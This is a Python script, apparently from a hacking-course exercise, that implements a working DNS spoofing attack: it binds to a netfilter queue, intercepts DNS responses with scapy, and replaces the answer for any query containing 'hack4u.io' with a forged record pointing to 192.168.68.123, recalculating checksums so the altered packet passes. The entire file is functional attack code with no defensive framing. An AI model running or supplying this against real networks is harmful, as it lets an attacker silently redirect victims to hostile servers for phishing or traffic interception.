#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import signal
from termcolor import colored
import sys

def signal_handler(signal,frame):#esto es para que cuando se presione ctrl+c se detenga el programa
    print(colored("\n Saliendo... \n","red"))
    sys.exit(1)
    
signal.signal(signal.SIGINT,signal_handler)


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())#convertimos el paquete a scapy
    if scapy_packet.haslayer(scapy.DNSRR):#si el paquete tiene la capa DNSRR
        qname = scapy_packet[scapy.DNSQR].qname#obtenemos el nombre de la pagina
        if b"hack4u.io" in qname:
            print(colored(f"[+] Spoofing target:{qname}","green"))
            answer = scapy.DNSRR(rrname=qname,rdata="192.168.68.123")#creamos una respuesta falsa
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            #eliminamos los campos de la capa IP y UDP para que scapy los recalcule
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            #volvemos a armar el paquete
            packet.set_payload(scapy_packet.build())

   
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()